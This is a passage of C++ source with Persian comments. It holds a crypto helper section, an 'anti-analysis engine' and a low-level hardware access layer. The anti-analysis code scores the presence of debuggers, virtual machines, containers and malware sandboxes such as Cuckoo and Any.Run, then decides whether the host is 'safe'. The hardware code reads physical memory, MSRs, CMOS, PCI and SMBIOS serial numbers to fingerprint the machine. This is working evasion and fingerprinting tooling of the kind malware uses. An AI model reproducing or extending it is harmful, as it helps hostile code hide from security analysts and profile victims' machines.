            for(int i=1;i<iters;i++){u=HMAC_SHA256::compute(pw,pl,u.data(),32);for(int j=0;j<32;j++)res[j]^=u[j];}
            size_t need=std::min(dkl-out.size(),(size_t)32);
            out.insert(out.end(),res.begin(),res.begin()+need);bn++;
        }
        return out;
    }
};

class SecureRandom {
public:
    static void fill(uint8_t* buf,size_t len){
        int fd=open("/dev/urandom",O_RDONLY);
        if(fd>=0){size_t t=0;while(t<len){ssize_t r=read(fd,buf+t,len-t);if(r<=0)break;t+=r;}close(fd);if(t==len)return;}
        for(size_t i=0;i<len;i++){uint32_t lo,hi;asm volatile("rdtsc":"=a"(lo),"=d"(hi));buf[i]=(uint8_t)((lo^hi^(lo>>8))&0xFF);}
    }
    static uint64_t random64(){uint64_t v;fill(reinterpret_cast<uint8_t*>(&v),8);return v;}
    static uint32_t random32(){uint32_t v;fill(reinterpret_cast<uint8_t*>(&v),4);return v;}
    static std::vector<uint8_t> bytes(size_t len){std::vector<uint8_t> b(len);fill(b.data(),len);return b;}
};

class Base64 {
public:
    static std::string encode(const uint8_t* data,size_t len){
        static const char t[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string r;r.reserve(((len+2)/3)*4);
        for(size_t i=0;i<len;i+=3){
            uint32_t n=(uint32_t)data[i]<<16;
            if(i+1<len)n|=(uint32_t)data[i+1]<<8;if(i+2<len)n|=(uint32_t)data[i+2];
            r+=t[(n>>18)&0x3F];r+=t[(n>>12)&0x3F];
            r+=(i+1<len)?t[(n>>6)&0x3F]:'=';r+=(i+2<len)?t[n&0x3F]:'=';
        }
        return r;
    }
    static std::string encode(const std::vector<uint8_t>& d){return encode(d.data(),d.size());}
};

} /* namespace Crypto */

/* ══════════════════════════════════════════════════════════════
 *  SECTION 2: ANTI-ANALYSIS ENGINE - 30 روش تشخیص
 * ══════════════════════════════════════════════════════════════ */

namespace AntiAnalysis {

class TimingOracle {
    uint64_t base_tsc,base_ns;double tsc_per_ns;bool cal;
public:
    TimingOracle():base_tsc(0),base_ns(0),tsc_per_ns(0),cal(false){}
    void calibrate(){
        uint32_t l1,h1,l2,h2;
        asm volatile("mfence;rdtsc":"=a"(l1),"=d"(h1));uint64_t n1=get_monotonic_ns();
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        asm volatile("mfence;rdtsc":"=a"(l2),"=d"(h2));uint64_t n2=get_monotonic_ns();
        uint64_t t1=((uint64_t)h1<<32)|l1,t2=((uint64_t)h2<<32)|l2;
        base_tsc=t1;base_ns=n1;if(n2>n1)tsc_per_ns=(double)(t2-t1)/(n2-n1);cal=true;
    }
    bool detect_slowdown(){
        if(!cal)calibrate();
        uint32_t l1,h1,l2,h2;
        asm volatile("mfence;rdtsc":"=a"(l1),"=d"(h1));
        volatile uint64_t x=0;for(int i=0;i<1000;i++)x+=i*i;
        asm volatile("mfence;rdtsc":"=a"(l2),"=d"(h2));
        return (((uint64_t)h2<<32|l2)-((uint64_t)h1<<32|l1))>100000;
    }
    bool detect_tsc_discrepancy(){
        if(!cal)return false;
        uint32_t lo,hi;asm volatile("rdtsc":"=a"(lo),"=d"(hi));
        uint64_t tsc=((uint64_t)hi<<32)|lo,ns=get_monotonic_ns();
        double exp=base_tsc+(ns-base_ns)*tsc_per_ns;
        return std::abs((double)tsc-exp)>exp*0.1;
    }
};

class DebuggerDetector {
public:
    static bool check_ptrace(){
        if(ptrace(PTRACE_TRACEME,0,nullptr,nullptr)==-1)return true;
        ptrace(PTRACE_DETACH,0,nullptr,nullptr);return false;
    }
    static bool check_proc_status(){
        std::string c=read_file_content("/proc/self/status");
        auto p=c.find("TracerPid:");
        if(p!=std::string::npos){int pid=0;sscanf(c.c_str()+p,"TracerPid:\t%d",&pid);return pid!=0;}
        return false;
    }
    static bool check_breakpoints(){
        volatile uint8_t* p=reinterpret_cast<volatile uint8_t*>(reinterpret_cast<void*>(&check_ptrace));
        return (*p==0xCC);
    }
    static bool check_int3_scan(){
        uint8_t* s=reinterpret_cast<uint8_t*>(reinterpret_cast<void*>(&check_ptrace));
        for(int i=0;i<256;i++)if(s[i]==0xCC)return true;return false;
    }
    static bool check_parent(){
        pid_t ppid=getppid();
        std::string nm=read_file_content("/proc/"+std::to_string(ppid)+"/comm");
        const char* dbg[]={"gdb","lldb","strace","ltrace","ida","radare2","r2","edb","valgrind","frida","pin","dynamorio"};
        for(auto d:dbg)if(nm.find(d)!=std::string::npos)return true;return false;
    }
    static bool check_ld_preload(){
        const char* p=getenv("LD_PRELOAD");
        if(p&&strlen(p)>0)return true;
        if(file_exists("/etc/ld.so.preload")){std::string c=read_file_content("/etc/ld.so.preload");if(!c.empty())return true;}
        return false;
    }
    static bool check_proc_maps(){
        std::ifstream m("/proc/self/maps");std::string l;
        while(std::getline(m,l)){
            if(l.find("libasan")!=std::string::npos||l.find("libtsan")!=std::string::npos||
               l.find("valgrind")!=std::string::npos||l.find("frida")!=std::string::npos||
               l.find("pin-")!=std::string::npos||l.find("vgpreload")!=std::string::npos)return true;
        }return false;
    }
    static bool check_proc_fd(){
        DIR* d=opendir("/proc/self/fd");if(!d)return false;
        int c=0;struct dirent* e;while((e=readdir(d))!=nullptr)c++;closedir(d);return c>30;
    }
    static bool check_signal(){
        struct sigaction old;sigaction(SIGTRAP,nullptr,&old);
        return old.sa_handler!=SIG_DFL&&old.sa_handler!=SIG_IGN;
    }
    static bool check_wchan(){
        std::string w=read_file_content("/proc/self/wchan");
        return w.find("ptrace")!=std::string::npos||w.find("trace")!=std::string::npos;
    }
    static bool check_seccomp(){return prctl(PR_GET_SECCOMP,0,0,0,0)>0;}
    static bool check_personality(){
        /* بررسی ADDR_NO_RANDOMIZE */
        unsigned long p=0;
        p=personality(0xffffffff);
        return (p&0x0040000)!=0; /* ADDR_NO_RANDOMIZE set by debuggers */
    }
    static int score(){
        int s=0;
        if(check_ptrace())s+=25;if(check_proc_status())s+=25;if(check_breakpoints())s+=20;
        if(check_int3_scan())s+=15;if(check_parent())s+=20;if(check_ld_preload())s+=15;
        if(check_proc_maps())s+=20;if(check_proc_fd())s+=10;if(check_signal())s+=10;
        if(check_wchan())s+=15;if(check_seccomp())s+=5;if(check_personality())s+=10;
        return s;
    }
};

class VMDetector {
public:
    static bool check_cpuid_hv(){uint32_t a,b,c,d;__cpuid(1,a,b,c,d);return (c>>31)&1;}
    static std::string get_hv_vendor(){
        uint32_t a,b,c,d;__cpuid(0x40000000,a,b,c,d);
        char v[13];memcpy(v,&b,4);memcpy(v+4,&c,4);memcpy(v+8,&d,4);v[12]='\0';return std::string(v);
    }
    static bool check_vm_mac(){
        int sock=socket(AF_INET,SOCK_DGRAM,0);if(sock<0)return false;
        const char* ifs[]={"eth0","ens33","ens160","enp0s3","enp0s8"};
        const uint8_t oui[][3]={{0x00,0x0C,0x29},{0x00,0x50,0x56},{0x08,0x00,0x27},{0x52,0x54,0x00},{0x00,0x1C,0x42},{0x00,0x16,0x3E},{0x00,0x15,0x5D}};
        struct ifreq ifr;
        for(auto i:ifs){memset(&ifr,0,sizeof(ifr));strncpy(ifr.ifr_name,i,IFNAMSIZ-1);
            if(ioctl(sock,SIOCGIFHWADDR,&ifr)==0){uint8_t* mac=(uint8_t*)ifr.ifr_hwaddr.sa_data;
                for(auto& o:oui)if(memcmp(mac,o,3)==0){close(sock);return true;}}}
        close(sock);return false;
    }
    static bool check_vm_dmi(){
        const char* files[]={"/sys/class/dmi/id/product_name","/sys/class/dmi/id/sys_vendor","/sys/class/dmi/id/board_vendor","/sys/class/dmi/id/bios_vendor","/sys/class/dmi/id/chassis_vendor"};
        const char* vs[]={"VMware","VirtualBox","QEMU","KVM","Xen","Hyper-V","Parallels","Bochs","innotek","Virtual","BHYVE","Amazon EC2","Google Compute"};
        for(auto f:files){std::string c=read_file_content(f);for(auto v:vs)if(c.find(v)!=std::string::npos)return true;}
        return false;
    }
    static bool check_vm_timing(){
        uint64_t tot=0;
        for(int i=0;i<20;i++){
            uint32_t l1,h1,l2,h2,ea,eb,ec,ed;
            asm volatile("mfence;rdtsc":"=a"(l1),"=d"(h1));
            __cpuid(0,ea,eb,ec,ed);
            asm volatile("mfence;rdtsc":"=a"(l2),"=d"(h2));
            tot+=(((uint64_t)h2<<32|l2)-((uint64_t)h1<<32|l1));
        }return (tot/20)>500;
    }
    static bool check_vm_artifacts(){
        const char* a[]={"/dev/vboxguest","/dev/vboxuser","/dev/vmci","/proc/xen","/sys/hypervisor/type","/dev/virtio-ports","/.dockerenv","/run/.containerenv"};
        for(auto f:a)if(file_exists(f))return true;return false;
    }
    static bool check_vm_processes(){
        const char* procs[]={"vmtoolsd","vmwaretray","VBoxService","VBoxClient","qemu-ga","spice-vdagent","xe-daemon","hv_kvp_daemon"};
        DIR* d=opendir("/proc");if(!d)return false;
        struct dirent* e;
        while((e=readdir(d))!=nullptr){
            if(e->d_type!=DT_DIR)continue;
            std::string cm=read_file_content(std::string("/proc/")+e->d_name+"/comm");
            for(auto p:procs)if(cm.find(p)!=std::string::npos){closedir(d);return true;}
        }closedir(d);return false;
    }
    static bool check_vm_cpuid_leaves(){
        uint32_t a,b,c,d;
        for(uint32_t l=0x40000000;l<=0x40000010;l++){__cpuid(l,a,b,c,d);if(a||b||c||d)return true;}
        return false;
    }
    static bool check_low_resources(){
        struct sysinfo si;sysinfo(&si);
        uint64_t ram=(uint64_t)si.totalram*si.mem_unit;
        if(ram<2ULL*1024*1024*1024)return true;if(si.procs<50)return true;
        return sysconf(_SC_NPROCESSORS_ONLN)<=1;
    }
    static bool check_vm_disk(){
        struct statvfs sv;if(statvfs("/",&sv)==0){uint64_t t=(uint64_t)sv.f_blocks*sv.f_frsize;if(t<20ULL*1024*1024*1024)return true;}return false;
    }
    static bool check_container(){
        if(file_exists("/.dockerenv"))return true;if(file_exists("/run/.containerenv"))return true;
        std::string cg=read_file_content("/proc/1/cgroup");
        return cg.find("docker")!=std::string::npos||cg.find("lxc")!=std::string::npos||cg.find("kubepods")!=std::string::npos;
    }
    static int score(){
        int s=0;
        if(check_cpuid_hv())s+=35;if(check_vm_mac())s+=20;if(check_vm_dmi())s+=25;
        if(check_vm_timing())s+=15;if(check_vm_artifacts())s+=20;if(check_vm_processes())s+=15;
        if(check_vm_cpuid_leaves())s+=10;if(check_low_resources())s+=10;if(check_vm_disk())s+=10;
        if(check_container())s+=15;return s;
    }
};

class SandboxDetector {
public:
    static bool check_uptime(){std::ifstream f("/proc/uptime");double s;f>>s;return s<300.0;}
    static bool check_files(){
        int c=0;const char* ds[]={"/home","/root","/tmp","/var/tmp"};
        for(auto d:ds){DIR* dir=opendir(d);if(!dir)continue;struct dirent* e;while((e=readdir(dir))!=nullptr)c++;closedir(dir);}
        return c<25;
    }
    static bool check_history(){
        auto f1=glob_files("/root/.*_history");auto f2=glob_files("/home/*/.*_history");
        f1.insert(f1.end(),f2.begin(),f2.end());
        for(auto& f:f1)if(file_size(f)>200)return false;return true;
    }
    static bool check_hostname(){
        std::string h=get_hostname();std::transform(h.begin(),h.end(),h.begin(),::tolower);
        const char* sus[]={"sandbox","malware","virus","analysis","cuckoo","joe","anubis","any.run","triage","hybrid","sample","test"};
        for(auto s:sus)if(h.find(s)!=std::string::npos)return true;return false;
    }
    static bool check_modules(){
        std::string m=read_file_content("/proc/modules");
        return m.find("cuckoomon")!=std::string::npos||m.find("sboxmon")!=std::string::npos;
    }
    static bool check_cpu_count(){return sysconf(_SC_NPROCESSORS_ONLN)<=1;}
    static bool check_resolution(){
        std::string x=exec_command("xrandr 2>/dev/null | head -1");
        return x.find("800x600")!=std::string::npos||x.find("1024x768")!=std::string::npos;
    }
    static bool check_mouse(){
        auto f=glob_files("/dev/input/event*");
        for(auto& e:f){struct stat st;if(stat(e.c_str(),&st)==0){auto diff=time(nullptr)-st.st_mtime;if(diff<60)return false;}}
        return true;
    }
    static int score(){
        int s=0;if(check_uptime())s+=20;if(check_files())s+=15;if(check_history())s+=15;
        if(check_hostname())s+=25;if(check_modules())s+=25;if(check_cpu_count())s+=10;
        if(check_resolution())s+=10;if(check_mouse())s+=10;return s;
    }
};

struct AnalysisResult {
    int debugger_score,vm_score,sandbox_score,total_score;
    bool is_safe;
    std::string hypervisor_vendor;
    std::vector<std::string> detections;
};

static AnalysisResult run_full_analysis() {
    AnalysisResult r;
    r.debugger_score=DebuggerDetector::score();
    r.vm_score=VMDetector::score();
    r.sandbox_score=SandboxDetector::score();
    r.total_score=r.debugger_score+r.vm_score+r.sandbox_score;
    if(VMDetector::check_cpuid_hv()){r.hypervisor_vendor=VMDetector::get_hv_vendor();r.detections.push_back("Hypervisor: "+r.hypervisor_vendor);}
    if(r.debugger_score>=30)r.detections.push_back("Debugger detected");
    if(r.vm_score>=30)r.detections.push_back("VM detected");
    if(r.sandbox_score>=30)r.detections.push_back("Sandbox detected");
    r.is_safe=(r.debugger_score<40&&r.total_score<80);
    return r;
}
} /* namespace AntiAnalysis */

/* ══════════════════════════════════════════════════════════════
 *  SECTION 3: HARDWARE ACCESS - دسترسی عمیق سخت‌افزاری
 * ══════════════════════════════════════════════════════════════ */

namespace Hardware {

class PortIO {
    bool priv;
public:
    PortIO():priv(false){if(iopl(3)==0)priv=true;}
    ~PortIO(){if(priv)iopl(0);}
    bool ok()const{return priv;}
    uint8_t in8(uint16_t p){if(!priv)return 0;uint8_t v;asm volatile("inb %1,%0":"=a"(v):"Nd"(p));return v;}
    uint16_t in16(uint16_t p){if(!priv)return 0;uint16_t v;asm volatile("inw %1,%0":"=a"(v):"Nd"(p));return v;}
    uint32_t in32(uint16_t p){if(!priv)return 0;uint32_t v;asm volatile("inl %1,%0":"=a"(v):"Nd"(p));return v;}
    void out8(uint16_t p,uint8_t v){if(priv)asm volatile("outb %0,%1"::"a"(v),"Nd"(p));}
    void out16(uint16_t p,uint16_t v){if(priv)asm volatile("outw %0,%1"::"a"(v),"Nd"(p));}
    void out32(uint16_t p,uint32_t v){if(priv)asm volatile("outl %0,%1"::"a"(v),"Nd"(p));}
};

class PhysicalMemory {
    int fd;bool avail;
public:
    PhysicalMemory():fd(-1),avail(false){fd=open("/dev/mem",O_RDONLY|O_SYNC);if(fd>=0)avail=true;}
    ~PhysicalMemory(){if(fd>=0)close(fd);}
    bool ok()const{return avail;}
    std::vector<uint8_t> read(uint64_t addr,size_t len){
        if(!avail||!len)return{};
        uint64_t po=addr%4096,pb=addr-po;size_t ml=((len+po+4095)/4096)*4096;
        void* m=mmap(nullptr,ml,PROT_READ,MAP_SHARED,fd,pb);
        if(m==MAP_FAILED)return{};
        uint8_t* p=(uint8_t*)m+po;std::vector<uint8_t> r(p,p+len);munmap(m,ml);return r;
    }
    bool search(uint64_t start,uint64_t end,const uint8_t* pat,size_t pl,uint64_t& found){
        const size_t chunk=65536;
        for(uint64_t a=start;a<end;a+=chunk-pl){
            size_t rl=std::min((uint64_t)chunk,end-a);auto d=read(a,rl);if(d.empty())continue;
            for(size_t i=0;i+pl<=d.size();i++)if(memcmp(d.data()+i,pat,pl)==0){found=a+i;return true;}
        }return false;
    }
};

class MSRAccess {
    std::map<int,int> fds;bool avail;
public:
    MSRAccess():avail(false){
        for(int c=0;c<8;c++){std::string p="/dev/cpu/"+std::to_string(c)+"/msr";int fd=open(p.c_str(),O_RDONLY);if(fd>=0){fds[c]=fd;avail=true;}}
    }
    ~MSRAccess(){for(auto& p:fds)close(p.second);}
    bool ok()const{return avail;}
    int cpu_count()const{return fds.size();}
    uint64_t read(uint32_t reg,int cpu=0){auto it=fds.find(cpu);if(it==fds.end())return 0;uint64_t v=0;pread(it->second,&v,sizeof(v),reg);return v;}
    std::map<int,uint64_t> read_all(uint32_t reg){std::map<int,uint64_t> r;for(auto& p:fds){uint64_t v=0;pread(p.second,&v,sizeof(v),reg);r[p.first]=v;}return r;}
};

struct CpuInfo {
    char vendor[13],brand[49];
    uint32_t signature,stepping,model,family,type,ext_model,ext_family,full_model,full_family;
    uint64_t features_ecx,features_edx,ext7_ebx,ext7_ecx,ext7_edx,tsc_freq;
    uint32_t max_cpuid,max_ext_cpuid,cache_line,logical_cpus,apic_id;
    uint32_t l1d_size,l1i_size,l2_size,l3_size;
    bool hypervisor,aes,avx,avx2,avx512f,rdrand,rdseed,sgx,smx,vmx,svm;
    bool sse,sse2,sse3,ssse3,sse41,sse42,fma,bmi1,bmi2,adx,sha,tsx_hle,tsx_rtm;
    std::map<uint32_t,std::array<uint32_t,4>> leaves;
    std::vector<std::string> cache_info;
};

class CPUIdentifier {
public:
    static CpuInfo identify() {
        CpuInfo ci;memset(&ci,0,sizeof(CpuInfo)-sizeof(ci.leaves)-sizeof(ci.cache_info));
        uint32_t ea,eb,ec,ed;
        __cpuid(0,ea,eb,ec,ed);ci.max_cpuid=ea;
        memcpy(ci.vendor,&eb,4);memcpy(ci.vendor+4,&ed,4);memcpy(ci.vendor+8,&ec,4);ci.vendor[12]='\0';
        for(uint32_t l=0;l<=ci.max_cpuid&&l<0x20;l++){__cpuid(l,ea,eb,ec,ed);ci.leaves[l]={ea,eb,ec,ed};}

        __cpuid(1,ea,eb,ec,ed);
        ci.signature=ea;ci.stepping=ea&0xF;ci.model=(ea>>4)&0xF;ci.family=(ea>>8)&0xF;
        ci.type=(ea>>12)&0x3;ci.ext_model=(ea>>16)&0xF;ci.ext_family=(ea>>20)&0xFF;
        ci.full_family=ci.family;if(ci.family==0xF)ci.full_family+=ci.ext_family;
        ci.full_model=ci.model;if(ci.family==0x6||ci.family==0xF)ci.full_model+=(ci.ext_model<<4);
        ci.features_ecx=ec;ci.features_edx=ed;
        ci.cache_line=((eb>>8)&0xFF)*8;ci.logical_cpus=(eb>>16)&0xFF;ci.apic_id=(eb>>24)&0xFF;

        ci.sse=(ed>>25)&1;ci.sse2=(ed>>26)&1;ci.sse3=(ec>>0)&1;ci.ssse3=(ec>>9)&1;
        ci.sse41=(ec>>19)&1;ci.sse42=(ec>>20)&1;ci.fma=(ec>>12)&1;ci.aes=(ec>>25)&1;
        ci.avx=(ec>>28)&1;ci.rdrand=(ec>>30)&1;ci.hypervisor=(ec>>31)&1;
        ci.vmx=(ec>>5)&1;ci.smx=(ec>>6)&1;

        if(ci.max_cpuid>=7){
            __cpuid_count(7,0,ea,eb,ec,ed);ci.ext7_ebx=eb;ci.ext7_ecx=ec;ci.ext7_edx=ed;
            ci.avx2=(eb>>5)&1;ci.bmi1=(eb>>3)&1;ci.bmi2=(eb>>8)&1;ci.rdseed=(eb>>18)&1;
            ci.sgx=(eb>>2)&1;ci.adx=(eb>>19)&1;ci.sha=(eb>>29)&1;ci.avx512f=(eb>>16)&1;
            ci.tsx_hle=(eb>>4)&1;ci.tsx_rtm=(eb>>11)&1;
        }

        __cpuid(0x80000000,ea,eb,ec,ed);ci.max_ext_cpuid=ea;
        for(uint32_t l=0x80000000;l<=ci.max_ext_cpuid&&l<0x80000020;l++){__cpuid(l,ea,eb,ec,ed);ci.leaves[l]={ea,eb,ec,ed};}

        if(ci.max_ext_cpuid>=0x80000004){
            uint32_t* b=reinterpret_cast<uint32_t*>(ci.brand);
            for(int i=0;i<3;i++){__cpuid(0x80000002+i,ea,eb,ec,ed);b[i*4]=ea;b[i*4+1]=eb;b[i*4+2]=ec;b[i*4+3]=ed;}
            ci.brand[48]='\0';
        }
        if(strncmp(ci.vendor,"AuthenticAMD",12)==0&&ci.max_ext_cpuid>=0x8000000A)ci.svm=true;

        /* کش */
        if(ci.max_cpuid>=4){
            for(int idx=0;idx<16;idx++){
                __cpuid_count(4,idx,ea,eb,ec,ed);int type=ea&0x1F;if(type==0)break;
                int level=(ea>>5)&7,ways=((eb>>22)&0x3FF)+1,parts=((eb>>12)&0x3FF)+1;
                int line=(eb&0xFFF)+1,sets=ec+1;uint32_t sz=ways*parts*line*sets;
                std::ostringstream o;o<<"L"<<level;
                if(type==1)o<<"D";else if(type==2)o<<"I";else o<<"U";
                o<<": "<<sz/1024<<"KB ("<<ways<<"-way, "<<line<<"B line)";
                ci.cache_info.push_back(o.str());
                if(level==1&&type==1)ci.l1d_size=sz;if(level==1&&type==2)ci.l1i_size=sz;
                if(level==2)ci.l2_size=sz;if(level==3)ci.l3_size=sz;
            }
        }

        /* TSC freq */
        auto t1=std::chrono::high_resolution_clock::now();
        uint64_t tsc1=read_tsc();std::this_thread::sleep_for(std::chrono::milliseconds(50));
        uint64_t tsc2=read_tsc();auto t2=std::chrono::high_resolution_clock::now();
        auto us=std::chrono::duration_cast<std::chrono::microseconds>(t2-t1).count();
        if(us>0)ci.tsc_freq=(tsc2-tsc1)*1000000ULL/us;
        return ci;
    }
    static uint64_t read_tsc(){uint32_t lo,hi;asm volatile("rdtsc":"=a"(lo),"=d"(hi));return((uint64_t)hi<<32)|lo;}
    static void serialize(const CpuInfo& ci,std::vector<uint8_t>& out){
        for(auto& p:ci.leaves){uint32_t l=p.first;for(int i=0;i<4;i++)out.push_back((l>>(i*8))&0xFF);
            for(int r=0;r<4;r++)for(int i=0;i<4;i++)out.push_back((p.second[r]>>(i*8))&0xFF);}
    }
};

class CMOSReader {
    PortIO& port;
public:
    CMOSReader(PortIO& p):port(p){}
    uint8_t read_reg(uint8_t r){port.out8(0x70,r);asm volatile("":::"memory");return port.in8(0x71);}
    void dump(uint8_t* buf,size_t c){for(size_t i=0;i<c&&i<256;i++)buf[i]=read_reg((uint8_t)i);}
    uint64_t fingerprint(){uint8_t d[256];dump(d,256);auto h=Crypto::SHA256::hash(d,256);uint64_t fp;memcpy(&fp,h.data(),8);return fp;}
};

struct PCIDevice {
    uint8_t bus,device,function;
    uint16_t vendor_id,device_id,subsys_vendor,subsys_device;
    uint8_t class_code,subclass,prog_if,revision,irq_line,irq_pin,header_type,caps_ptr;
    uint16_t command,status;
    uint32_t bar[6];
    std::vector<uint8_t> config,capabilities;
    std::string class_name;
};

class PCIScanner {
    PortIO& port;
    uint32_t cfg(uint8_t b,uint8_t d,uint8_t f,uint8_t o){
        uint32_t a=(1u<<31)|((uint32_t)b<<16)|((uint32_t)(d&0x1F)<<11)|((uint32_t)(f&7)<<8)|(o&0xFC);
        port.out32(0xCF8,a);return port.in32(0xCFC);
    }
    std::string classify(uint8_t cc,uint8_t sc){
        if(cc==0x01){if(sc==0x01)return"IDE";if(sc==0x06)return"SATA";if(sc==0x08)return"NVMe";return"Storage";}
        if(cc==0x02)return"Network";if(cc==0x03)return"Display";if(cc==0x04)return"Multimedia";
        if(cc==0x05)return"Memory";if(cc==0x06){if(sc==0x00)return"Host Bridge";if(sc==0x01)return"ISA";return"Bridge";}
        if(cc==0x07)return"Communication";if(cc==0x08)return"System";
        if(cc==0x0C){if(sc==0x03)return"USB";if(sc==0x05)return"SMBus";return"Serial Bus";}
        if(cc==0x0D)return"Wireless";return"Other";
    }
public:
    PCIScanner(PortIO& p):port(p){}
    std::vector<PCIDevice> enumerate(){
        std::vector<PCIDevice> devs;
        for(int b=0;b<256;b++)for(int d=0;d<32;d++)for(int f=0;f<8;f++){
            uint32_t r0=cfg(b,d,f,0);uint16_t vid=r0&0xFFFF;if(vid==0xFFFF){if(f==0)break;continue;}
            PCIDevice dev;dev.bus=b;dev.device=d;dev.function=f;dev.vendor_id=vid;dev.device_id=(r0>>16)&0xFFFF;
            uint32_t r1=cfg(b,d,f,4);dev.command=r1&0xFFFF;dev.status=(r1>>16)&0xFFFF;
            uint32_t r2=cfg(b,d,f,8);dev.revision=r2&0xFF;dev.prog_if=(r2>>8)&0xFF;dev.subclass=(r2>>16)&0xFF;dev.class_code=(r2>>24)&0xFF;
            dev.class_name=classify(dev.class_code,dev.subclass);
            uint32_t r3=cfg(b,d,f,0x0C);dev.header_type=(r3>>16)&0xFF;
            for(int i=0;i<6;i++)dev.bar[i]=cfg(b,d,f,0x10+i*4);
            uint32_t sub=cfg(b,d,f,0x2C);dev.subsys_vendor=sub&0xFFFF;dev.subsys_device=(sub>>16)&0xFFFF;
            dev.caps_ptr=cfg(b,d,f,0x34)&0xFF;
            uint32_t irq=cfg(b,d,f,0x3C);dev.irq_line=irq&0xFF;dev.irq_pin=(irq>>8)&0xFF;
            dev.config.resize(256);for(int o=0;o<256;o+=4){uint32_t v=cfg(b,d,f,o);memcpy(dev.config.data()+o,&v,4);}
            if(dev.status&0x10){uint8_t ptr=dev.caps_ptr&0xFC;int lim=48;
                while(ptr&&lim-->0){dev.capabilities.push_back(dev.config[ptr]);ptr=dev.config[ptr+1]&0xFC;}}
            devs.push_back(dev);if(f==0&&!(dev.header_type&0x80))break;
        }return devs;
    }
    uint64_t fingerprint(const std::vector<PCIDevice>& devs){
        std::vector<uint8_t> d;for(auto& dev:devs)d.insert(d.end(),dev.config.begin(),dev.config.end());
        auto h=Crypto::SHA256::hash(d);uint64_t fp;memcpy(&fp,h.data(),8);return fp;
    }
};

class SMBIOSParser {
    PhysicalMemory& pmem;
    std::string extract_str(const std::vector<uint8_t>& d,size_t hl,int idx){
        if(idx<=0)return"";size_t pos=hl;int cur=1;
        while(pos<d.size()){if(cur==idx){std::string s;while(pos<d.size()&&d[pos])s+=(char)d[pos++];return s;}
            while(pos<d.size()&&d[pos])pos++;pos++;cur++;if(pos<d.size()&&d[pos]==0)break;}return"";
    }
    std::string format_uuid(const uint8_t* p){
        std::ostringstream o;o<<std::hex<<std::setfill('0');
        o<<std::setw(2)<<(int)p[3]<<std::setw(2)<<(int)p[2]<<std::setw(2)<<(int)p[1]<<std::setw(2)<<(int)p[0]<<"-"
         <<std::setw(2)<<(int)p[5]<<std::setw(2)<<(int)p[4]<<"-"<<std::setw(2)<<(int)p[7]<<std::setw(2)<<(int)p[6]<<"-"
         <<std::setw(2)<<(int)p[8]<<std::setw(2)<<(int)p[9]<<"-";
        for(int i=10;i<16;i++)o<<std::setw(2)<<(int)p[i];return o.str();
    }
public:
    struct Info {
        std::string bios_vendor,bios_version,bios_date,bios_release;
        std::string sys_mfg,sys_product,sys_version,sys_serial,sys_uuid,sys_sku,sys_family;
        std::string board_mfg,board_product,board_version,board_serial,board_asset;
        std::string chassis_mfg,chassis_type,chassis_serial,chassis_asset;
        std::vector<std::string> processors,memory_devices,slots;
        std::vector<std::pair<uint8_t,std::vector<uint8_t>>> raw;
        int table_count;
    };
    SMBIOSParser(PhysicalMemory& pm):pmem(pm){}
    Info parse(){
        Info info;info.table_count=0;
        const uint8_t s3[]={'_','S','M','3','_'},s2[]={'_','S','M','_'};
        uint64_t ep=0;bool found=pmem.search(0xF0000,0x100000,s3,5,ep)||pmem.search(0xF0000,0x100000,s2,4,ep);
        if(!found)return info;
        auto epd=pmem.read(ep,64);if(epd.size()<24)return info;
        uint32_t taddr,tlen;
        if(epd[0]=='_'&&epd[1]=='S'&&epd[2]=='M'&&epd[3]=='3'&&epd[4]=='_'){tlen=*(uint32_t*)&epd[12];taddr=(uint32_t)(*(uint64_t*)&epd[16]);}
        else{tlen=*(uint16_t*)&epd[22];taddr=*(uint32_t*)&epd[24];}
        auto table=pmem.read(taddr,tlen);if(table.empty())return info;
        size_t off=0;
        while(off+4<=table.size()){
            uint8_t type=table[off],length=table[off+1];if(type==127)break;if(off+length>table.size())break;
            size_t se=off+length;while(se+1<table.size()){if(table[se]==0&&table[se+1]==0){se+=2;break;}se++;}
            std::vector<uint8_t> entry(table.begin()+off,table.begin()+std::min(se,table.size()));
            info.raw.push_back({type,entry});info.table_count++;
            if(type==0&&length>=18){info.bios_vendor=extract_str(entry,length,entry[4]);info.bios_version=extract_str(entry,length,entry[5]);info.bios_date=extract_str(entry,length,entry[8]);if(length>=22)info.bios_release=std::to_string(entry[20])+"."+std::to_string(entry[21]);}
            else if(type==1&&length>=8){info.sys_mfg=extract_str(entry,length,entry[4]);info.sys_product=extract_str(entry,length,entry[5]);info.sys_version=extract_str(entry,length,entry[6]);info.sys_serial=extract_str(entry,length,entry[7]);if(length>=25)info.sys_uuid=format_uuid(&entry[8]);if(length>=27){info.sys_sku=extract_str(entry,length,entry[25]);info.sys_family=extract_str(entry,length,entry[26]);}}
            else if(type==2&&length>=8){info.board_mfg=extract_str(entry,length,entry[4]);info.board_product=extract_str(entry,length,entry[5]);info.board_version=extract_str(entry,length,entry[6]);info.board_serial=extract_str(entry,length,entry[7]);if(length>=9)info.board_asset=extract_str(entry,length,entry[8]);}
            else if(type==3&&length>=9){info.chassis_mfg=extract_str(entry,length,entry[4]);info.chassis_type=std::to_string(entry[5]);info.chassis_serial=extract_str(entry,length,entry[7]);info.chassis_asset=extract_str(entry,length,entry[8]);}
            else if(type==4&&length>=26){std::ostringstream o;o<<"Socket:"<<extract_str(entry,length,entry[4])<<" Mfg:"<<extract_str(entry,length,entry[7])<<" Cores:"<<(int)entry[23]<<" Threads:"<<(int)entry[25];info.processors.push_back(o.str());}
            else if(type==17&&length>=27){uint16_t sz=*(uint16_t*)&entry[12];std::ostringstream o;o<<"Size:"<<sz<<"MB Loc:"<<extract_str(entry,length,entry[16])<<" Mfg:"<<extract_str(entry,length,entry[23])<<" SN:"<<extract_str(entry,length,entry[24]);info.memory_devices.push_back(o.str());}
            else if(type==9&&length>=13){std::ostringstream o;o<<"Slot:"<<extract_str(entry,length,entry[4])<<" Type:"<<(int)entry[5]<<" InUse:"<<((entry[7]==4)?"Y":"N");info.slots.push_back(o.str());}
            off=se;
        }return info;
    }
};

class ACPIScanner {
    PhysicalMemory& pmem;
public:
    struct Table {char sig[5];uint32_t length;uint8_t revision;uint64_t address;std::string oem_id,oem_table_id;uint32_t oem_revision;std::vector<uint8_t> data;};
    ACPIScanner(PhysicalMemory& pm):pmem(pm){}
